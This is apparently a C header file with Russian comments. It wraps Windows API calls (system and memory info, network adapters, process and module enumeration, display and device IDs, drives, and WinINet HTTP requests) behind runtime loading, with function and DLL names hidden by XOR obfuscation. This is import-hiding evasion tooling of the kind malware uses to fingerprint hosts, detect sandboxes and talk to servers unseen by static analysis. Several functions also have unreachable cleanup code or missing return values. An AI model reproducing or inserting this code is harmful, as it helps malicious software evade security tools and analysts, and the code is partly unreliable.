#ifndef FUNCK_H
#define FUNCK_H

#include <windows.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <Iphlpapi.h>
#include <ws2tcpip.h>
#include <string.h>
#include <psapi.h>
#include <setupapi.h>
#include <tchar.h>
#include <cfgmgr32.h>
#include <wininet.h>


void Xor_Encrypt(char* data, size_t len, const char* key) {         // Данную функцию вставляем в проект
    size_t key_len = strlen(key);                   // Вычисляем длину ключа
    for (size_t i = 0; i < len; ++i) {              // Применяем xor к каждому байту байту данных
        data[i] ^= key[i % key_len];
    }
}


void ProxyGetSystemInfo(LPSYSTEM_INFO lpSystemInfo) {

    typedef void(WINAPI* pGetSystemInfo)(LPSYSTEM_INFO);        // Создаем тип pGetSystemInfo, который представляет указатель на функцию, 
                                                                // принимающую указатель на SYSTEM_INFO, и не возвращающую значение
                                                                // это позволит динмамически загружать функцию GetSystemInfo
                                                                // Указываем что возвращает и что принимает

    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";
    
    // char funcName[] = "GetSystemInfo";
    // char funcName[] = { 'G','e','t','S','y','s','t','e','m','I','n','f','o','\0' };
    char funcName[14] = {0x03, 0x23, 0x31, 0x04, 0x29, 0x24, 0x24, 0x21, 0x3E, 0x19, 0x28, 0x23, 0x3F, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = "kernel32.dll";
    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63, 0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);                 // Загружаем дескриптор библиотеки kernel32.dll, которая содержит GetSystemInfo
    pGetSystemInfo GetSystemInfoFunc = (pGetSystemInfo)GetProcAddress(hKernel32, funcName); // Получаем адрес функции GetSystemInfo в этой библиотеке

    if (GetSystemInfoFunc != NULL) {                            // Если функция загружена, вызываем ее
        GetSystemInfoFunc(lpSystemInfo);                        // Вызов функции GetSystemInfo
    } else {
        // printf("Error: GetSystemInfo function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


void ProxySleep(int second_sleep) {
    typedef void(WINAPI* pSleep)(int);

    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";
    
    // char funcName[] = { 'S','l','e','e','p','\0'};
    char funcName[6] = {0x17, 0x2A, 0x20, 0x32, 0x20, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63, 0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);
    pSleep SleepFunc = (pSleep)GetProcAddress(hKernel32, funcName);
    if (SleepFunc != NULL) {
        SleepFunc(second_sleep);
    } else {
        // printf("Error: Sleep function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


ULONGLONG ProxyGetTickCount64(void) {
    typedef ULONGLONG(WINAPI* pProxyGetTickCount64)(void);

    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";

    // char funcName[] = { 'G','e','t','T','i','c','k','C','o','u','n','t','6','4','\0'};
    char funcName[15] = {0x03, 0x23, 0x31, 0x03, 0x39, 0x34, 0x3B, 0x07, 0x3C, 0x25, 0x28, 0x31, 0x66, 0x63, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63, 0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);
    pProxyGetTickCount64 ProxyGetTickCount64Func = (pProxyGetTickCount64)GetProcAddress(hKernel32, funcName);
    if (ProxyGetTickCount64Func != NULL) {
        return ProxyGetTickCount64Func();
    } else {
        // printf("Error: GetTickCount64 function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


WINBOOL ProxyGlobalMemoryStatusEx(LPMEMORYSTATUSEX lpBuffer) {
    typedef WINBOOL(WINAPI* pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
    
    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";

    //char funcName[] = { 'G','l','o','b','a','l','M','e','m','o','r','y','S','t','a','t','u','s','E','x','\0' };
    char funcName[21] = {0x03, 0x2A, 0x2A, 0x35, 0x31, 0x3B, 0x1D, 0x21, 0x3E, 0x3F, 0x34, 0x3C, 0x03, 0x23, 0x24, 0x25, 0x3A, 0x26, 0x16, 0x3C, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[13] = {0x2F, 0x23, 0x37, 0x39, 0x35, 0x3B, 0x63, 0x76, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);
    pGlobalMemoryStatusEx GlobalMemoryStatusExFunc = (pGlobalMemoryStatusEx)GetProcAddress(hKernel32, funcName);
    if (GlobalMemoryStatusExFunc != NULL) {           
        GlobalMemoryStatusExFunc(lpBuffer);            
    } else {
        // printf("Error: GlobalMemoryStatusEx function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


DWORD ProxyGetAdaptersInfo(PIP_ADAPTER_INFO pAdapterInfo, PULONG dwSize) {
    typedef ULONG(WINAPI* pGetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);
    
    const char *key = "DFEWPWPDSPFEPWEQOUSDFUIKKSLASDJQFSSKFLWKSKEFJLSS";

    // char funcName[] = { 'G','e','t','A','d','a','p','t','e','r','s','I','n','f','o','\0' };
    char funcName[16] = {0x03, 0x23, 0x31, 0x16, 0x34, 0x36, 0x20, 0x30, 0x36, 0x22, 0x35, 0x0C, 0x3E, 0x31, 0x2A, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'i','p','h','l','p','a','p','i','.','d','l','l','\0' };
    char name_dll[13] = {0x2D, 0x36, 0x2D, 0x3B, 0x20, 0x36, 0x20, 0x2D, 0x7D, 0x34, 0x2A, 0x29, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hIphlpApi = LoadLibraryA(name_dll);
    pGetAdaptersInfo GetAdaptersInfoFunc = (pGetAdaptersInfo)GetProcAddress(hIphlpApi, funcName);
    if (GetAdaptersInfoFunc != NULL) {
        return GetAdaptersInfoFunc(pAdapterInfo, dwSize);
    } else {
        // printf("Error: GetAdaptersInfo function not found!\n");
        exit(1);
    }
    FreeLibrary(hIphlpApi);
}


BOOL ProxyEnumProcesses(DWORD* lpidProcess, DWORD cb, DWORD* lpcbNeeded) {
    typedef BOOL(WINAPI* pEnumProcesses)(DWORD*, DWORD, DWORD*);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
    
    // char funcName[] = { 'E','n','u','m','P','r','o','c','e','s','s','e','s','\0' };
    char funcName[14] = {0x17, 0x2B, 0x32, 0x27, 0x04, 0x38, 0x2E, 0x29, 0x26, 0x38, 0x38, 0x34, 0x38, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'p','s','a','p','i','.','d','l','l','\0' };
    char name_dll[10] = {0x22, 0x36, 0x26, 0x3A, 0x3D, 0x64, 0x25, 0x26, 0x2F, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hPsApi = LoadLibraryA(name_dll);
    pEnumProcesses EnumProcessesFunc = (pEnumProcesses)GetProcAddress(hPsApi, funcName);
    if (EnumProcessesFunc != NULL) {
        EnumProcessesFunc(lpidProcess, cb, lpcbNeeded);
    } else {
        // printf("Error: EnumProcesses function not found!\n");
        exit(1);
    }
    FreeLibrary(hPsApi);
}


HANDLE ProxyOpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId) {
    typedef HANDLE(WINAPI* pOpenProcess)(DWORD, WINBOOL, DWORD);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";

    // char funcName[] = { 'O','p','e','n','P','r','o','c','e','s','s','\0' };
    char funcName[12] = {0x1D, 0x35, 0x22, 0x24, 0x04, 0x38, 0x2E, 0x29, 0x26, 0x38, 0x38, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[14] = {0x39, 0x20, 0x35, 0x24, 0x31, 0x26, 0x72, 0x78, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);
    pOpenProcess OpenProcessFunc = (pOpenProcess)GetProcAddress(hKernel32, funcName);
    if (OpenProcessFunc != NULL) {
        HANDLE hProcess = OpenProcessFunc(dwDesiredAccess, bInheritHandle, dwProcessId);
        return hProcess;
    } else {
        // printf("Error: OpenProcess function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


BOOL ProxyEnumProcessModules(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded) {
    typedef HANDLE(WINAPI* pEnumProcessModules)(HANDLE, HMODULE*, DWORD, LPDWORD);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";

    // char funcName[] = { 'E','n','u','m','P','r','o','c','e','s','s','M','o','d','u','l','e','s','\0' };
    char funcName[19] = {0x17, 0x2B, 0x32, 0x27, 0x04, 0x38, 0x2E, 0x29, 0x26, 0x38, 0x38, 0x1C, 0x24, 0x35, 0x31, 0x27, 0x23, 0x38, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'p','s','a','p','i','.','d','l','l','\0' };
    char name_dll[10] = {0x22, 0x36, 0x26, 0x3A, 0x3D, 0x64, 0x25, 0x26, 0x2F, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hPsApi = LoadLibraryA(name_dll);
    pEnumProcessModules EnumProcessModulesFunc = (pEnumProcessModules)GetProcAddress(hPsApi, funcName);
    if (EnumProcessModulesFunc != NULL) {
        EnumProcessModulesFunc(hProcess, lphModule, cb, lpcbNeeded);
    } else {
        // printf("Error: EnumProcessModules function not found!\n");
        exit(1);
    }
    FreeLibrary(hPsApi);
}


DWORD ProxyGetModuleBaseName(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize) {
    typedef DWORD(WINAPI* pGetModuleBaseName)(HANDLE, HMODULE, LPSTR, DWORD);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";

    //char funcName[] = { 'G','e','t','M','o','d','u','l','e','B','a','s','e','N','a','m','e','A','\0' };
    char funcName[19] = {0x15, 0x20, 0x33, 0x07, 0x3B, 0x2E, 0x34, 0x26, 0x26, 0x09, 0x2A, 0x22, 0x2E, 0x1F, 0x25, 0x26, 0x23, 0x0A, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'p','s','a','p','i','.','d','l','l','\0' };
    char name_dll[10] = {0x22, 0x36, 0x26, 0x3A, 0x3D, 0x64, 0x25, 0x26, 0x2F, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);

    HMODULE hPsApi = LoadLibraryA(name_dll);
    pGetModuleBaseName GetModuleBaseNameFunc = (pGetModuleBaseName)GetProcAddress(hPsApi, funcName);
    if (GetModuleBaseNameFunc != NULL) {
        GetModuleBaseNameFunc(hProcess, hModule, lpBaseName, nSize);
    } else {
        // printf("Error: GetModuleBaseNameA function not found!\n");
        exit(1);
    }
    FreeLibrary(hPsApi);
}


BOOL ProxyEnumDisplayDevices(LPCSTR lpDevice, DWORD iDevNum, PDISPLAY_DEVICEA lpDisplayDevice, DWORD dwFlags) {
    typedef BOOL(WINAPI* pEnumDisplayDevices)(LPCSTR, DWORD, PDISPLAY_DEVICEA, DWORD);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
    
    // char funcName[] = { 'E','n','u','m','D','i','s','p','l','a','y','D','e','v','i','c','e','s','A','\0' };
    char funcName[20] = {0x17, 0x2B, 0x32, 0x27, 0x10, 0x23, 0x32, 0x3A, 0x2F, 0x2A, 0x32, 0x15, 0x2E, 0x27, 0x2D, 0x28, 0x23, 0x38, 0x10, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'u','s','e','r','3','2','.','d','l','l','\0' };
    char name_dll[11] = {0x27, 0x36, 0x22, 0x38, 0x67, 0x78, 0x6F, 0x2E, 0x2F, 0x27, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hUser32 = LoadLibraryA(name_dll);
    pEnumDisplayDevices EnumDisplayDevicesFunc = (pEnumDisplayDevices)GetProcAddress(hUser32, funcName);
    if (EnumDisplayDevicesFunc != NULL) {
        EnumDisplayDevicesFunc(lpDevice, iDevNum, lpDisplayDevice, dwFlags);
    } else {
        // printf("Error: EnumDisplayDevicesA function not found!\n");
        exit(1);
    }
    FreeLibrary(hUser32);
}


HDEVINFO ProxySetupDiGetClassDevs(const GUID *ClassGuid, PCSTR Enumerator, HWND hwndParent, DWORD Flags) {
    typedef HDEVINFO(WINAPI* pSetupDiGetClassDevs)(const GUID *, PCSTR, HWND, DWORD);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";

    // char funcName[] = { 'S','e','t','u','p','D','i','G','e','t','C','l','a','s','s','D','e','v','s','A','\0' };
    char funcName[21] = {0x01, 0x20, 0x33, 0x3F, 0x24, 0x0E, 0x28, 0x0D, 0x26, 0x3F, 0x08, 0x3D, 0x2A, 0x22, 0x37, 0x0F, 0x23, 0x3D, 0x22, 0x12, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 's','e','t','u','p','a','p','i','.','d','l','l','\0' };
    char name_dll[13] = {0x21, 0x20, 0x33, 0x3F, 0x24, 0x2B, 0x31, 0x23, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hSetupApi = LoadLibraryA(name_dll);
    pSetupDiGetClassDevs SetupDiGetClassDevsFunc = (pSetupDiGetClassDevs)GetProcAddress(hSetupApi, funcName);
    if (SetupDiGetClassDevsFunc != NULL) {
        return SetupDiGetClassDevsFunc(ClassGuid, Enumerator, hwndParent, Flags);
    } else {
        // printf("Error: SetupDiGetClassDevsA function not found!\n");
        exit(1);
    }
    FreeLibrary(hSetupApi);
}


WINBOOL ProxySetupDiEnumDeviceInfo(HDEVINFO DeviceInfoSet, DWORD MemberIndex, PSP_DEVINFO_DATA DeviceInfoData) {
    typedef WINBOOL(WINAPI* pSetupDiEnumDeviceInfo)(HDEVINFO, DWORD, PSP_DEVINFO_DATA);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";

    // char funcName[] = { 'S','e','t','u','p','D','i','E','n','u','m','D','e','v','i','c','e','I','n','f','o','\0' };
    char funcName[22] = {0x01, 0x20, 0x33, 0x3F, 0x24, 0x0E, 0x28, 0x0F, 0x2D, 0x3E, 0x26, 0x15, 0x2E, 0x27, 0x2D, 0x28, 0x23, 0x02, 0x3F, 0x35, 0x2B, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 's','e','t','u','p','a','p','i','.','d','l','l','\0' };
    char name_dll[13] = {0x21, 0x20, 0x33, 0x3F, 0x24, 0x2B, 0x31, 0x23, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hSetupApi = LoadLibraryA(name_dll);
    pSetupDiEnumDeviceInfo SetupDiEnumDeviceInfoFunc = (pSetupDiEnumDeviceInfo)GetProcAddress(hSetupApi, funcName);
    if (SetupDiEnumDeviceInfoFunc != NULL) {
        return SetupDiEnumDeviceInfoFunc(DeviceInfoSet, MemberIndex, DeviceInfoData);
    } else {
        // printf("Error: SetupDiEnumDeviceInfo function not found!\n");
        exit(1);
    }
    FreeLibrary(hSetupApi);
}



BOOL ProxySetupDiGetDeviceInstanceIdA(HDEVINFO DeviceInfoSet, PSP_DEVINFO_DATA DeviceInfoData, PSTR DeviceInstanceId, DWORD DeviceInstanceIdSize, PDWORD RequiredSize) {
    typedef BOOL(WINAPI* pSetupDiGetDeviceInstanceIdA)(HDEVINFO, PSP_DEVINFO_DATA, PSTR, DWORD, PDWORD);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";

    // char funcName[] = { 'S','e','t','u','p','D','i','G','e','t','D','e','v','i','c','e','I','n','s','t','a','n','c','e','I','d','A','\0' };
    char funcName[28] = {0x01, 0x20, 0x33, 0x3F, 0x24, 0x0E, 0x28, 0x0D, 0x26, 0x3F, 0x0F, 0x34, 0x3D, 0x38, 0x27, 0x2E, 0x0F, 0x25, 0x22, 0x27, 0x25, 0x25, 0x32, 0x2E, 0x0D, 0x2F, 0x13, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 's','e','t','u','p','a','p','i','.','d','l','l','\0' };
    char name_dll[13] = {0x21, 0x20, 0x33, 0x3F, 0x24, 0x2B, 0x31, 0x23, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hSetupApi = LoadLibraryA(name_dll);
    pSetupDiGetDeviceInstanceIdA SetupDiGetDeviceInstanceIdAFunc = (pSetupDiGetDeviceInstanceIdA)GetProcAddress(hSetupApi, funcName);
    if (SetupDiGetDeviceInstanceIdAFunc != NULL) {
        return SetupDiGetDeviceInstanceIdAFunc(DeviceInfoSet, DeviceInfoData, DeviceInstanceId, DeviceInstanceIdSize, RequiredSize);
    } else {
        // printf("Error: SetupDiGetDeviceInstanceIdA function not found!\n");
        exit(1);
    }
    FreeLibrary(hSetupApi);
}


DWORD  ProxyGetLogicalDrives(void) {
    typedef DWORD(WINAPI* pGetLogicalDrives)(void);

    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";

    // char funcName[] = { 'G','e','t','L','o','g','i','c','a','l','D','r','i','v','e','s','\0' };
    char funcName[17] = {0x15, 0x20, 0x33, 0x06, 0x3B, 0x2D, 0x28, 0x29, 0x22, 0x27, 0x0F, 0x23, 0x22, 0x27, 0x21, 0x38, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[13] = {0x39, 0x20, 0x35, 0x24, 0x31, 0x26, 0x72, 0x78, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);
    pGetLogicalDrives GetLogicalDrivesFunc = (pGetLogicalDrives)GetProcAddress(hKernel32, funcName);
    if (GetLogicalDrivesFunc != NULL) {
        return GetLogicalDrivesFunc();
    } else {
        // printf("Error: GetLogicalDrives function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


BOOL __stdcall ProxyGetDiskFreeSpaceExA(LPCSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes) {
    typedef BOOL (WINAPI* pGetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";

    // char funcName[] = { 'G','e','t','D','i','s','k','F','r','e','e','S','p','a','c','e','E','x','A','\0' };
    char funcName[20] = {0x15, 0x20, 0x33, 0x0E, 0x3D, 0x39, 0x2A, 0x0C, 0x31, 0x2E, 0x2E, 0x02, 0x3B, 0x30, 0x27, 0x2E, 0x03, 0x33, 0x10, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'k','e','r','n','e','l','3','2','.','d','l','l','\0' };
    char name_dll[13] = {0x39, 0x20, 0x35, 0x24, 0x31, 0x26, 0x72, 0x78, 0x6D, 0x2F, 0x27, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hKernel32 = LoadLibraryA(name_dll);
    pGetDiskFreeSpaceExA GetDiskFreeSpaceExAFunc = (pGetDiskFreeSpaceExA)GetProcAddress(hKernel32, funcName);
    if (GetDiskFreeSpaceExAFunc != NULL) {
        return GetDiskFreeSpaceExAFunc(lpDirectoryName, lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes);
    } else {
        // printf("Error: GetDiskFreeSpaceExA function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


HINTERNET ProxyInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags) {
    typedef HINTERNET (WINAPI* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    
    const char *key = "REGJTJAJCKKQKQDKFKQSDKQKDK";
    
    // char funcName[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A','\0' };
    char funcName[14] = {0x1B, 0x2B, 0x33, 0x2F, 0x26, 0x24, 0x24, 0x3E, 0x0C, 0x3B, 0x2E, 0x3F, 0x0A, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    //char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char name_dll[12] = {0x25, 0x2C, 0x29, 0x23, 0x3A, 0x2F, 0x35, 0x64, 0x27, 0x27, 0x27, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWinInet = LoadLibraryA(name_dll);
    pInternetOpenA InternetOpenAFunc = (pInternetOpenA)GetProcAddress(hWinInet, funcName);
    if (InternetOpenAFunc != NULL) {
        return InternetOpenAFunc(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
    } else {
        // printf("Error: InternetOpenA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


HINTERNET ProxyInternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
    typedef HINTERNET (WINAPI* pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A','\0' };
    char funcName[17] = {0x1F, 0x2D, 0x33, 0x31, 0x37, 0x3F, 0x36, 0x38, 0x05, 0x23, 0x3F, 0x22, 0x36, 0x27, 0x38, 0x07, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWinInet = LoadLibraryA(name_dll);
    pInternetConnectA InternetConnectAFunc = (pInternetConnectA)GetProcAddress(hWinInet, funcName);
    if (InternetConnectAFunc != NULL) {
        return InternetConnectAFunc(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
    } else {
        // printf("Error: InternetConnectA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


HINTERNET ProxyHttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) {
    typedef HINTERNET (WINAPI* pHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";
    
    // char funcName[] = { 'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A','\0' };
    char funcName[17] = {0x1E, 0x37, 0x33, 0x24, 0x0A, 0x21, 0x36, 0x22, 0x14, 0x29, 0x20, 0x39, 0x36, 0x37, 0x38, 0x07, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWinInet = LoadLibraryA(name_dll);
    pHttpOpenRequestA HttpOpenRequestAFunc = (pHttpOpenRequestA)GetProcAddress(hWinInet, funcName);
    if (HttpOpenRequestAFunc != NULL) {
        return HttpOpenRequestAFunc(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
    } else {
        // printf("Error: HttpOpenRequestA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


WINBOOL ProxyHttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) {
    typedef WINBOOL (WINAPI* pHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','A','\0' };
    char funcName[17] = {0x1E, 0x37, 0x33, 0x24, 0x16, 0x34, 0x3D, 0x28, 0x14, 0x29, 0x20, 0x39, 0x36, 0x37, 0x38, 0x07, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);
    
    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWinInet = LoadLibraryA(name_dll);
    pHttpSendRequestA HttpSendRequestAFunc = (pHttpSendRequestA)GetProcAddress(hWinInet, funcName);
    if (HttpSendRequestAFunc != NULL) {
        return HttpSendRequestAFunc(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
    } else {
        // printf("Error: HttpSendRequestA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


WINBOOL ProxyInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
    typedef WINBOOL (WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0' };
    char funcName[17] = {0x1F, 0x2D, 0x33, 0x31, 0x37, 0x3F, 0x36, 0x38, 0x14, 0x29, 0x30, 0x28, 0x15, 0x2D, 0x20, 0x23, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
    
    HMODULE hWinInet = LoadLibraryA(name_dll);
    pInternetReadFile InternetReadFileFunc = (pInternetReadFile)GetProcAddress(hWinInet, funcName);
    if (InternetReadFileFunc != NULL) {
        return InternetReadFileFunc(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
    } else {
        // printf("Error: InternetReadFile function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


WINBOOL ProxyInternetCloseHandle(HINTERNET hInternet) {
    typedef WINBOOL(WINAPI* pInternetCloseHandle)(HINTERNET);
    
    const char *key = "VCGTEQSLFLQLSDLFPLDFSDFA";

    // char funcName[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0' };
    char funcName[20] = {0x1F, 0x2D, 0x33, 0x31, 0x37, 0x3F, 0x36, 0x38, 0x05, 0x20, 0x3E, 0x3F, 0x36, 0x0C, 0x2D, 0x28, 0x34, 0x20, 0x21, 0x00 };
    Xor_Encrypt(funcName, strlen(funcName), key);

    // char name_dll[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char name_dll[12] = {0x21, 0x2A, 0x29, 0x3D, 0x2B, 0x34, 0x27, 0x62, 0x22, 0x20, 0x3D, 0x00 };
    Xor_Encrypt(name_dll, strlen(name_dll), key);
